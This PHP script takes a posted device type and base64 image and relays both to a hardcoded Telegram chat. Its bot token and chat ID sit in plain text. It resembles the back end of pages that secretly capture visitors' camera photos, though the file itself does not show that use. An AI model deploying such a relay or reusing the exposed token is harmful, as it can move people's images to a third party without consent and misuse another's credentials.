<?php
$token = "7426704918:AAGnnhOQFGR2fiLc9PrWG4YZnE_si1gnuSQ";
$chat_id = "1304304626";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);

    $deviceType = $data['deviceType'];
    $imageData = $data['imageData'];
    $messageText = "Device Type: $deviceType";

    // Mengirim pesan teks
    sendMessage($token, $chat_id, $messageText);

    // Mengirim gambar
    sendPhoto($token, $chat_id, $imageData);
}

function sendMessage($token, $chat_id, $message) {
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
    file_get_contents($url);
}

function sendPhoto($token, $chat_id, $imageData) {
    $imageData = str_replace('data:image/png;base64,', '', $imageData);
    $imageData = str_replace(' ', '+', $imageData);
    $binaryData = base64_decode($imageData);

    $url = "https://api.telegram.org/bot$token/sendPhoto";
    
    $tempFile = tmpfile();
    fwrite($tempFile, $binaryData);
    $tempFilePath = stream_get_meta_data($tempFile)['uri'];

    $post_fields = [
        'chat_id' => $chat_id,
        'photo' => new CURLFile($tempFilePath, 'image/png', 'photo.png')
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_exec($ch);
    curl_close($ch);

    fclose($tempFile); // Hapus file sementara
}
?>
